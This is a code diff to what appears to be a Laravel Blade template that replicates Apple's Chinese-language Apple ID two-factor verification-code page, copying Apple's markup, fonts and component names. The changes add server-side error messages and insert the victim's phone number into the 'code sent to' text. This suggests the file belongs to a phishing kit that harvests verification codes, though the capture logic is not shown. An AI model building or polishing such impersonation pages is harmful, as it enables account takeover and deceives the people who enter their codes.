@@ -12,6 +12,20 @@
     <style type="text/css"></style>
 </head>
 
+<style>
+    .form-message-wrappers {
+        font-size: 12px;
+        line-height: 1.33337;
+        font-weight: 400;
+        letter-spacing: -.01em;
+        font-family: SF Pro Text, SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif;
+        color: #e30000;
+        position: relative;
+        margin-top: .47059rem;
+        margin-bottom: .70588rem;
+    }
+</style>
+
 <body class="tk-body">
     <div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.
     </div>
@@ -27,20 +41,10 @@
                         <hsa2 class="auth-v1" suppress-iforgot="{suppressIforgot}"
                             skip-trust-browser-step="{skipTrustBrowserStep}">
 
-
-
-
-
-
                             <div class="hsa2">
 
                                 <verify-device {two-factor-verification-support-url}="twoFactorVerificationSupportUrl"
                                     {recovery-available}="recoveryAvailable" suppress-iforgot="{suppressIforgot}">
-
-
-
-
-
 
                                     <div class="verify-device fade-in ">
                                         <div class="">
@@ -136,9 +140,17 @@
                                                 <div class="error pop-bottom">验证码不正确</div>
                                             </div>
 
+{{--                                            判断是否存在 错误信息--}}
+
+{{--                                            @if (!empty($error = session('Error')))--}}
+                                                <div class="form-message-wrappers" >
+                                                    <span class="form-message"> {{ session('Error') }}</span>
+                                                </div>
+{{--                                            @endif--}}
+
                                             <div class="si-info">
                                                 <p>
-                                                    一条包含验证码的信息已发送至 {$Number}。输入验证码以继续。
+                                                    一条包含验证码的信息已发送至 {{$phoneNumber}}。输入验证码以继续。
                                                 </p>
                                             </div>
 
@@ -291,8 +303,6 @@
                                                                             href="#">
                                                                             更多选项…<span class="sr-only">在新窗口中打开。</span>
                                                                         </a>
-
-
                                                                         <p id="useNeedHelpInfo" class="tk-subbody">
                                                                             请确认你的电话号码，以获得支持。
                                                                         </p>
@@ -305,30 +315,13 @@
 
                                             </div>
                                         </other-options-popover>
-
                                     </div>
-
-
                                 </verify-device>
-
-
-
                             </div>
-
-
                         </hsa2>
                     </div>
                 </div>
                 <div id="stocking" style="display:none !important;"></div>
-
-
-
-
-
-
-
-
-
 
             </div>
             <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
